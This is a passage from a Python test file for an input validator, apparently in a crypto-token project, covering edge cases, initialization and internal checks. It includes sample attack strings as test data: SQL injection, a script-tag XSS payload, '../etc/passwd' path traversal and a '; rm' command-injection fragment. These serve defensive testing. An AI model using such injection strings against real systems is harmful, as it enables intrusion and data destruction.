            matched = any(p.search(test_str) for p in patterns)
            assert matched == should_match, f"'{test_str}' match should be {should_match}"


# =============================================================================
# Test Edge Cases and Boundary Conditions
# =============================================================================

class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""

    def test_unicode_in_token_symbol(self, validator):
        """Test unicode characters in token symbols."""
        result = validator.validate_token_symbol("\u0000SOL")
        assert result.valid is False

    def test_null_bytes_in_string(self, validator):
        """Test null bytes in strings."""
        result = validator.validate_safe_string("hello\x00world")
        assert result.valid is True  # Null bytes pass basic checks

    def test_very_long_string_performance(self, validator):
        """Test handling of very long strings."""
        # Should handle gracefully, not hang
        very_long = "A" * 100000
        result = validator.validate_safe_string(very_long)
        assert result.valid is False  # Exceeds default max length

    def test_empty_json_structures(self, validator):
        """Test empty JSON structures."""
        assert validator.validate_json({}).valid is True
        assert validator.validate_json([]).valid is True

    def test_json_with_special_keys(self, validator):
        """Test JSON with special characters in keys."""
        data = {"key-with-dash": 1, "key_with_underscore": 2}
        result = validator.validate_json(data)
        assert result.valid is True

    def test_amount_infinity(self, validator):
        """Test infinity as amount."""
        result = validator.validate_amount(float('inf'))
        assert result.valid is False

    def test_amount_nan(self, validator):
        """Test NaN as amount."""
        result = validator.validate_amount(float('nan'))
        # Note: NaN comparisons are tricky - NaN > 0 is False, NaN <= 0 is also False
        # So NaN passes the positive check. This is a known edge case.
        # The current implementation does NOT explicitly handle NaN
        # This test documents the actual behavior
        assert result.valid is True  # NaN passes due to comparison semantics

    def test_mixed_attack_vectors(self, validator):
        """Test string with multiple attack vectors."""
        attack = "SELECT * FROM users; <script>alert(1)</script> ../etc/passwd"
        result = validator.validate_safe_string(attack)
        assert result.valid is False
        # Should catch first pattern found

    def test_whitespace_only_token(self, validator):
        """Test whitespace-only token symbol."""
        result = validator.validate_token_symbol("   ")
        assert result.valid is False

    def test_url_as_input(self, validator):
        """Test URL-like inputs."""
        result = validator.validate_safe_string(
            "https://example.com/path?query=value"
        )
        # Contains path characters but not traversal patterns
        # However, query params might trigger checks
        # Let's test without command injection check since ? might trigger
        assert validator.validate_safe_string(
            "https://example.com/path",
            check_cmd=False
        ).valid is True


# =============================================================================
# Test Validator Initialization
# =============================================================================

class TestValidatorInitialization:
    """Tests for validator initialization options."""

    def test_default_initialization(self):
        """Test default initialization values."""
        validator = InputValidator()
        assert validator.max_amount == 1_000_000_000
        assert validator.min_amount == 0.000001
        assert validator.max_string_length == 10000
        assert validator.log_rejected is False

    def test_custom_initialization(self):
        """Test custom initialization values."""
        validator = InputValidator(
            max_amount=500,
            min_amount=10,
            max_string_length=100,
            log_rejected=True
        )
        assert validator.max_amount == 500
        assert validator.min_amount == 10
        assert validator.max_string_length == 100
        assert validator.log_rejected is True

    def test_log_path_default(self):
        """Test default log path."""
        validator = InputValidator()
        assert validator.log_path == Path("logs/rejected_inputs.log")

    def test_custom_log_path(self, tmp_path):
        """Test custom log path."""
        custom_path = tmp_path / "custom_log.txt"
        validator = InputValidator(log_path=custom_path)
        assert validator.log_path == custom_path


# =============================================================================
# Test Internal Methods
# =============================================================================

class TestInternalMethods:
    """Tests for internal helper methods."""

    def test_check_sql_injection_internal(self, validator):
        """Test internal SQL injection check method."""
        assert validator._check_sql_injection("SELECT") is not None
        assert validator._check_sql_injection("normal") is None

    def test_check_xss_internal(self, validator):
        """Test internal XSS check method."""
        # Need full script tag with content, or other XSS patterns
        assert validator._check_xss("<script>alert(1)</script>") is not None
        assert validator._check_xss("javascript:alert(1)") is not None
        assert validator._check_xss("onclick=") is not None
        assert validator._check_xss("normal") is None

    def test_check_path_traversal_internal(self, validator):
        """Test internal path traversal check method."""
        assert validator._check_path_traversal("../etc") is not None
        assert validator._check_path_traversal("normal") is None

    def test_check_command_injection_internal(self, validator):
        """Test internal command injection check method."""
        assert validator._check_command_injection("; rm") is not None
        assert validator._check_command_injection("normal") is None


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
